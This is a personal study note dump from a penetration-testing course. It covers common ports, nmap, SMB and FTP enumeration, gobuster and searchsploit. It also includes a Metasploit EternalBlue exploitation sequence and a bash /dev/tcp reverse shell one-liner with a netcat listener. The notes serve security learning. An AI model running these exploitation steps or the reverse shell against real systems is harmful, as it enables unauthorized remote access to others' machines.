# Just General Notes from the Pentration tester path. Note dump really.
---
## Common Ports
20/21   (TCP)	    FTP File Transfer Protocol, used to move files around
22      (TCP)	    SSH Secure Shell, used to securly connect to and manage hosts
23      (TCP)	    Telnet Same as SSH just not secure at all, used to connect to hosts and manage them just in clear text.
25      (TCP)	    SMTP Simple Mail Tranfer Protocol used to send and recieve mail for mail servers.
80      (TCP)	    HTTP Hypertext Transfer Protocol used to tranfer web content between client and a web server.
161     (TCP/UDP)	SNMP Simple Network Management Protocol used to monitor, manage and configure network devices - pull metrics - network invetory ect.
389     (TCP/UDP)	LDAP Lightweight Directory Access Protocol - used to query directory services, like active directory.
443     (TCP)	    SSL/TLS (HTTPS) Hypertext Transfer Protocol Secure - encypted secure version of HTTP. used for loading websites ect.
445     (TCP)	    SMB Server Message Block network local file sharing, people stand up and SMB drive and others connect to it and pull files.
3389    (TCP)	    RDP Remote Desktop Protocol - Like SSH but has an interactive session that you can interact with the GUI of the host.

### Different Tools
**SSH** - Can be configered for password or passwordless configuration, with public-key authentication. Uses a client server model. IE the host needs to be running OpenSSH or an SSH server.
Usage 
```bash
ssh bob@10.10.10.10
```
**Netcat** - Netcat, is a networking utility. iAnd is great for connecting shells in a pen test. You can use it to either catch a connection or send one. Can also be used for banner grabbing which basically you point it at a port on the target host and it will return the service running on that port. 
```bash
nc 10.10.10.10 22
```
**returns OpenSSH running on 22**

**Tmux** - Used for multiboxing terminals, ctr + b opens a new terminal, and we can swtich between them with 0, 1 ect. Shift + " will split them horizontally, and Shift + % will split them vertically. Also can switch between the windows with up down left or right keypad arrows.

**VIM** - a text editor.. to edit file hit i (insert mode) 
Command	Description
x	    Cut character
dw	    Cut word
dd	    Cut full line
yw	    Copy word
yy	    Copy full line
p	    Paste
:1	    Go to line number 1.
:w	    Write the file, save
:q	    Quit
:q!	    Quit without saving
:wq	    Write and quit

**Ports** - range from 1 to 65,535 well known ports are 1 through 1023, port 0 is treted as a wild card port.

**NMAP** - Used to scan hosts in a subnet and enumerate services operating on ports. Just doing --
```bash
namp <target_ip>
```
will run a quick scan against the 1000 most common ports returning the state, service, port, ect. We can use the -sC parameter to define nmap common/default scripts usage. the -sV flag will identify the service and version from the scan. -p- will tell nmap to scan all 1-65,000 ports (all ports) this will take alot longer than just a standard scan.
    NMAP scripts in general can extend the utility of NMAP notably. To find them we can run
```bash
locate scripts/<script_you_want>
```
```bash
nmap --script <script_name> -p<ports> <host>
```

**FTP** - File transfer protocol can be used to pull files from a host if left open with anonymous login allowed.
usage
```bash
ftp -p 10.129.42.253
get login.txt
```
**SMB** - Server Message Block can actually be used for RCE via eternal blue, but for the most part another good vector to find sensitive files and passwords, like seen in ftp. smb-os-disovery.nse can be used to extract the OS running on a host, can be usefull. To login to an smv share the following works for listing all the shares on a client
```bash
smbclient -N -L \\\\10.129.53.353
```
that will also list the users and the shares they are a part of. To target a users share run.
```bash 
smbclient \\\\10.129.42.253\\users
```
If you need to do it in the contex of a user the following works but also will prompt for a password.
```bash
smbclient -U bob \\\\10.129.43.253\users
```
---
#### Web Eumeration

**Gobuster** - Versatile tool that can perform DNS, vhost, and directory brute-forcing. Can also enumerate public AWS S3 buckets. 
Usage - directory bruteforce mode.
```bash
gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
Link to http status codes: https://en.wikipedia.org/wiki/List_of_HTTP_status_codes

Installation of Seclist
```bash 
git clone https://github.com/danielmiessler/SecLists
sudo apt install seclists -y 
```

Usage - dns subnet enumeration
```bash
gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
```

**Banner Grabbing** - Banner grabbing on web servers is another enumeration tactic that can reveal specific application frameworks in use. This can be gleaned by using curl.
Usage -
```bash
curl -IL https://www.inlanefreight.com
```

**Whatweb** - Can be used to extract the version of web servers, supporting frameworks, and applications using the command-line tool.
Usage - 
```bash
whatweb 10.1.10.121
```

**Certificates** - Certificates are another valuable source of information when https is in use. Looking at the certificates could show the email domain, the company and other phishing based targets.

**Robots.txt** - This instructs the search engine web crawlers, like googlebot which rescource can and cannot be accessed for indexing. 

**Source Code** - The source code of a site might have mistakes by a developer leaving comments in the code for a test account ect.
##### Public Exploits
Once services have been identified via NMAP scan, we want to ensure wether or not they have public exploits available. First off just google the service version and exploit is the lowest hanging fruit. Other exploit sites are **Exploit DB**, **Rapid7 DB**, or **vulnerability lab**.

**searchsploit** - can be used to find exploits via bash shell. 

Installation
```bash
sudo apt install exploitdb -y
```
usage - search for an exploit and version
```bash
searchsploit openssh 7.2
```
**Metasploit** - can also be used to search exploits and quickly plug them in and use them.
usage - in metasploit console
```bash
msfconsole
search exploit eternalblue
use exploit/windows/smb/ms17_010_psexec
show options
set RHOST <target>
set LHOST <tun0>
check (check if vuln)
exploit (execute exploit)
getuid (check privs)
shell (get interactive shell)
```

###### Types of Shells
**Reverse Shell** - Sends a shell back to a listener port. For instance setting up a nc lisener on your local Kali host, and sending a connection back from the target host. 
Exmaple
Local Kali:
```bash
nc -lvpn 1234
```
Target Host:
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```
This will go back and start a bash shell on the local Kali host.
